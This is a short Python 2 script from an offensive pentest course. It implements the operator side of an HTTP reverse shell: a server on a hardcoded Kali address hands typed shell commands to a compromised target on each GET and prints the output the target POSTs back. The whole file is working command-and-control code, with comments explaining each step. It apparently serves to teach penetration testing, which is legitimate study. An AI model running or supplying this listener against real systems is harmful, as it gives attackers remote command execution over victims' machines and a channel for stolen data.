# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


#Basic HTTP server


import BaseHTTPServer   # Built-in library we use to build simple HTTP server 

HOST_NAME = '10.10.10.100'   # Kali IP address 
PORT_NUMBER = 80   # Listening port number 


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):   # MyHandler defines what we should do when we receive a GET/POST request
                                                          # from the client / target

    def do_GET(s):
                                         #If we got a GET request, we will:- 
        command = raw_input("Shell> ")   #take user input
        s.send_response(200)             #return HTML status 200 (OK)
        s.send_header("Content-type", "text/html")  # Inform the target that content type header is  "text/html"
        s.end_headers()
        s.wfile.write(command)           #send the command which we got from the user input

            
    def do_POST(s):
                                                     #If we got a POST, we will:- 
        s.send_response(200)                         #return HTML status 200 (OK)
        s.end_headers()
        length  = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains, the length
                                                     #value has to be integer 
        postVar = s.rfile.read(length)               # Read then print the posted data
        print postVar
        
        

if __name__ == '__main__':


    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)
    
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)


    
    try:     
        httpd.serve_forever()   # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt:   
        print '[!] Server is terminated'
        httpd.server_close()













